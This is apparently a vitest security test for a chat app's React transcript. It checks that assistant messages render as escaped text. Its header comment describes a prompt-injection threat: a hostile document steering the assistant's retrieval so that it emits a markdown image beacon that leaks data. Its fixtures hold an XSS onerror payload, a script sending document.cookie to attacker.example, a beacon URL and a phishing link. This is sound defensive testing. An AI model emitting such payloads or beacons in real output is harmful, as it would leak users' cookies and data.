import { renderToStaticMarkup } from 'react-dom/server'
import { createElement } from 'react'
import { readFileSync } from 'node:fs'
import { describe, expect, it } from 'vitest'

import { Transcript } from '@/app/dashboard/chat/ui'
import type { ChatMessage } from '@/lib/db/types'

/**
 * GUARD: chat output renders as plain text, with no markup interpretation.
 *
 * This is a load bearing security control, not a styling choice
 * (docs/DECISIONS.md, 2026-08-06; docs/AUDIT_2026_08.md M1). The assistant's
 * grounding can be steered by a hostile published document, and the reason
 * that caps out at social engineering instead of automatic exfiltration is
 * that model output is never interpreted: a markdown image beacon
 * (![](https://attacker/?d=...)) renders as literal characters a human would
 * have to retype. Adding a markdown or HTML renderer to chat bubbles is a
 * security redesign requiring exfiltration analysis, and this suite is what
 * makes that change impossible to ship by accident.
 */

const HOSTILE: { name: string; content: string; mustNotRender: string[] }[] = [
  {
    name: 'an HTML image with an event handler',
    content: '<img src=x onerror=alert(1)>',
    mustNotRender: ['<img'],
  },
  {
    name: 'a script tag',
    content: '<script>fetch("https://attacker.example/?c="+document.cookie)</script>',
    mustNotRender: ['<script'],
  },
  {
    name: 'a markdown image beacon, the standard RAG exfiltration primitive',
    content: 'Here you go ![](https://attacker.example/?d=secret)',
    mustNotRender: ['<img', 'src="https://attacker.example'],
  },
  {
    name: 'a markdown link',
    content: 'Click [here](https://evil.example/phish) to fix it',
    mustNotRender: ['href="https://evil.example'],
  },
  {
    name: 'markdown emphasis',
    content: '**URGENT** call _this number_ now',
    mustNotRender: ['<strong', '<em'],
  },
]

function render(content: string): string {
  const message = {
    id: 'm1',
    conversation_id: 'c1',
    org_id: 'o1',
    role: 'assistant',
    content,
    created_at: '2026-08-06T12:00:00Z',
    provider: null,
    model: null,
    input_tokens: null,
    output_tokens: null,
    grounded_article_ids: null,
  } as ChatMessage
  return renderToStaticMarkup(
    createElement(Transcript, { messages: [message] }),
  )
}

describe('assistant output is never interpreted', () => {
  for (const payload of HOSTILE) {
    it(`renders ${payload.name} as inert text`, () => {
      const html = render(payload.content)
      for (const marker of payload.mustNotRender) {
        expect(html).not.toContain(marker)
      }
      // The payload survives AS TEXT: escaped, visible, harmless. The angle
      // bracket check proves escaping rather than stripping, so a reader can
      // still see exactly what the model tried to say.
      if (payload.content.includes('<')) {
        expect(html).toContain('&lt;')
      }
    })
  }
})

describe('no chat surface imports interpretation machinery', () => {
  // The render test above proves the shared Transcript; the two interactive
  // surfaces (the pane and the popup widget) use hooks and cannot render in
  // this harness, so the guard on them is structural: no markdown module, no
  // dangerouslySetInnerHTML, anywhere in the chat surfaces.
  const surfaces = [
    'src/app/dashboard/chat/ui.tsx',
    'src/app/dashboard/chat/chat-pane.tsx',
    'src/app/dashboard/chat/citations.tsx',
    'src/app/dashboard/_shell/ask-talvext-widget.tsx',
  ]

  for (const path of surfaces) {
    it(`${path} interprets nothing`, () => {
      const source = readFileSync(path, 'utf8')
      expect(source).not.toContain('dangerouslySetInnerHTML')
      expect(source).not.toMatch(/articles\/markdown|markdown-view|marked|remark|rehype/)
    })
  }
})
